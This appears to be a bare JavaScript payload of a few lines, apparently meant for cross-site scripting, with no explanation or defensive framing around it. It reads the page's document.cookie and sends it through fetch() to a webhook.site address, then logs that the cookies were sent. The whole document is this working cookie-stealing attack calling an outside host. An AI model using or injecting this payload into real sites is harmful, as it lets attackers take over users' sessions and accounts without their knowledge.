fetch('https://webhook.site/cf2541c9-2417-4163-8573-8692a9b3fcc5/?cookie=' + encodeURIComponent(document.cookie))
    .then(response => response.text())
    .then(data => console.log("Cookies sent successfully:", data))
    .catch(error => console.error("Error sending cookies:", error));
